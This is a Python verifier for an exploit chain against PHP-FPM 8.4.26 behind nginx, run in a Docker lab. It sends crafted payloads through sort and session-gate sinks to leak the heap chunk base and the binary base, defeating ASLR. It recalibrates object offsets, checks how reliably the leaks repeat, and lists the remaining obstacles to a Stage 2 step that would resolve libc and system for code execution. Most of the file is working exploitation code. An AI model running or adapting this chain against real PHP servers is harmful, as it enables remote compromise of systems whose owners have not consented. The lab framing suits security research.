#!/usr/bin/env python3
"""Verifier for fpm_fullchain_sinkexfil.py (packaged fpm chain, comparison sink).
Lands through a comparison/branch app sink, no serialize echo, no /proc. Against
an isolated nginx -> php-fpm 8.4.26 lab exposing a usort/ORDER BY sort render + an
ordered session gate: checks the sinks classify by behavior, that Stage 1
exfils both the chunk base (SORT sink cross-agreed with the ORDERED gate) and
binbase (one forged read over the SORT sink, 2MB-aligned, byte-exact vs an
echo-mirror ground truth), reports the recalibrated element-0 offset
(--calibrate), checks N/N Stage-1 reliability, and documents the Stage 2 walls.
The echo mirror is ground truth only; the exfil rides row order / status alone.
Pure stdlib, safe under python3 -I. Lab/analysis use only.

Lab bring-up:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-pkg --profile pkg up -d --build
    python3 -I poc/chains/verify_fpm_fullchain_sinkexfil.py --port 8159 [--calibrate] [--runs 5]
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import struct
import sys

_POC = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_POC)  # poc/


def _load(fname):
    path = os.path.join(_POC, fname)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, fname)
    spec = importlib.util.spec_from_file_location(fname[:-3], path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_POC, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


X = _load("primitives/oracles/sideeffect_exfil_apps.py")


def _u64(b):
    return struct.unpack("<Q", b + b"\x00" * (8 - len(b)))[0]


def _chunk(b):
    return _u64(b) & X.CHUNK_MASK


def calibrate(http, log):
    """Re-derive OBJ_OFF_SORT / OBJ_OFF_ORDERED via the echo mirror."""
    payload, spray = X.build_leak_payload()
    for _ in range(4):
        http.post("/reflect.php", [(b"sess", payload)])
    tv = X.reflect_field(http, [(b"sess", payload)])
    H = None
    for k in range(8):
        vo = 8 + k * 32
        o = struct.unpack_from("<Q", spray, vo)[0]
        c = struct.unpack_from("<Q", tv, vo)[0]
        if o != c and c > 0x10000:
            H = c
            break
    chunk = H & X.CHUNK_MASK
    log(f"[calibrate] chunk base = 0x{chunk:x}")
    shapes = {
        "OBJ_OFF_ORDERED (gate.php: sess+need)": [(b"need", bytes(X.GUESS_PAD))],
        "OBJ_OFF_SORT    (order.php: rows+256 cand[])": [(b"cand[]", bytes(1))] * 256,
    }
    for label, extra in shapes.items():
        found = None
        for D in range(0x5B000, 0x5B400, 8):
            A = chunk + D
            g = X.reflect_field(http,
                                [(b"sess", X.build_isstring_payload(A - 0x18))] + extra)
            if not g or len(g) < 8:
                continue
            V = struct.unpack_from("<Q", g, 0)[0]
            if ((V & 0xFFF) == (X.ZVAL_PTR_DTOR_OFF & 0xFFF) and V > 0x100000000
                    and (V - X.ZVAL_PTR_DTOR_OFF) & 0x1FFFFF == 0):
                found = D + 0x08
                break
        log(f"[calibrate] {label} = {hex(found) if found else 'NOT FOUND'}")
    return 0


def _ground_truth(http):
    """Echo-mirror ground truth for (chunk base, binbase) at the sort shape."""
    payload, spray = X.build_leak_payload()
    for _ in range(4):
        http.post("/reflect.php", [(b"rows", payload)])
    tv = X.reflect_field(http, [(b"rows", payload)])
    chunk = None
    if tv:
        for k in range(8):
            vo = 8 + k * 32
            o = struct.unpack_from("<Q", spray, vo)[0]
            c = struct.unpack_from("<Q", tv, vo)[0]
            if o != c and c > 0x10000:
                chunk = c & X.CHUNK_MASK
                break
    if chunk is None:
        return None, None
    obj = chunk + X.OBJ_OFF_SORT
    isp = X.build_isstring_payload(obj - 0x20)
    truth_f = X.reflect_field(http, [(b"rows", isp)] + [(b"cand[]", bytes(1))] * 256)
    dtor_bytes = truth_f[:X.PTR_BYTES] if truth_f else None
    binbase = (_u64(dtor_bytes) - X.ZVAL_PTR_DTOR_OFF) if dtor_bytes else None
    return chunk, binbase


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8159)
    ap.add_argument("--calibrate", action="store_true",
                    help="re-derive the per-shape OBJ offsets via the echo mirror")
    ap.add_argument("--runs", type=int, default=3,
                    help="Stage-1 reliability runs (binbase must be byte-identical)")
    a = ap.parse_args(argv)

    http = X.Http(a.host, a.port)
    if a.calibrate:
        return calibrate(http, print)

    url = f"http://{a.host}:{a.port}"
    pkg = _load("fpm_fullchain_sinkexfil.py")

    # [0] behavioral detection
    sinks = X.autodetect(http, log=print)
    if not {"sort", "ordered"}.issubset(sinks):
        print(f"[0] FAIL: need sort+ordered sinks, got {set(sinks)}. Bring the lab "
              f"up: docker compose -f docker-compose.fpm-avenues.yml -p p2s-pkg --profile pkg up -d --build",
              file=sys.stderr)
        return 2
    print("[0] lab reachable; sort + ordered comparison sinks classified by behavior")

    # ground truth (verifier-only echo mirror; never on the exfil path)
    gt_chunk, gt_binbase = _ground_truth(http)
    print(f"[gt] echo-mirror ground truth: chunk=0x{(gt_chunk or 0):x} "
          f"binbase=0x{(gt_binbase or 0):x}")

    # [1] Stage 1 -- the packaged no-echo exfil of BOTH pointers
    passed = True
    print("[1] STAGE 1 (no echo): packaged exfil of chunk + binbase")
    chunk, binbase, d = pkg.stage1_exfil(url, log=lambda *a: None)
    ok_chunk = (chunk is not None and gt_chunk is not None and chunk == gt_chunk)
    ok_agree = bool(d.get("chunk_agree"))
    ok_bb = (binbase is not None and gt_binbase is not None and binbase == gt_binbase
             and (binbase & 0x1FFFFF) == 0)
    passed &= ok_chunk and ok_agree and ok_bb
    print(f"    chunk   = 0x{(chunk or 0):x}  match-gt={ok_chunk}  "
          f"sort/ordered-agree={ok_agree}")
    print(f"    binbase = 0x{(binbase or 0):x}  match-gt(byte-exact)={ok_bb}  "
          f"(&zval_ptr_dtor=0x{d.get('dtor', 0):x})")
    print(f"    stage-1 requests = {d.get('reqs')}  (no serialize echo on any)")

    # [2] recalibrated OBJ offset for the sort shape
    print(f"[2] recalibrated OBJ_OFF_SORT = {X.OBJ_OFF_SORT:#x} "
          f"(ordered gate shape = {X.OBJ_OFF_ORDERED:#x}); fpm_binbase_rleak's "
          f"0x{pkg._load('primitives/read_leak/fpm_binbase_leak.py').OBJ_CHUNK_OFF:x} is the "
          f"miscalibrated value this corrects")

    # [3] N/N reliability of Stage 1
    good = 0
    first = binbase
    for i in range(a.runs):
        c2, b2, _ = pkg.stage1_exfil(url, log=lambda *a: None)
        hit = (b2 is not None and b2 == gt_binbase and c2 == gt_chunk)
        good += 1 if hit else 0
        print(f"    run {i + 1}/{a.runs}: chunk=0x{(c2 or 0):x} "
              f"binbase=0x{(b2 or 0):x}  {'OK' if hit else 'MISS'}")
    passed &= (good == a.runs)
    print(f"[3] Stage-1 reliability: {good}/{a.runs} byte-identical no-echo exfils")

    # [4] Stage-2 walls (documented; fire is proven on 8.5.11-fpm elsewhere)
    print("[4] STAGE 2 (fire) walls on this 8.4.26 build, fully-no-echo:")
    print("    WALL 1 (structural): a pure comparison sink carries anchored,")
    print("            fixed-offset reads (the chunk leak + the binbase image")
    print("            pointers) but NOT a7's by-name resolution (R-3..R-6):")
    print("            no controlled-length arbitrary read exists, and deep")
    print("            random access over the sink costs ~1 request/byte-of-")
    print("            offset -> the resolution reads need the a7 reflective read.")
    print("    WALL 2 (calibration): fpm_route resolves executor_globals/libc/")
    print("            system on 8.4.26 but its R-5 class_table offset (EG+0x1D0)")
    print("            is 8.5.x-calibrated; re-derive EG->class_table for 8.4.26.")
    print(f"[total] {http.reqs} verifier requests (mirror ground truth included)")

    print(f"\nRESULT: {'PASS' if passed else 'FAIL'} - the packaged Goal-A fpm "
          f"chain exfils chunk+binbase {'FULLY no-echo, byte-exact' if passed else 'INCOMPLETELY'} "
          f"through a common comparison sink (binbase was the fpm blocker). "
          f"The fire is gated by WALL 1/WALL 2 above.")
    return 0 if passed else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
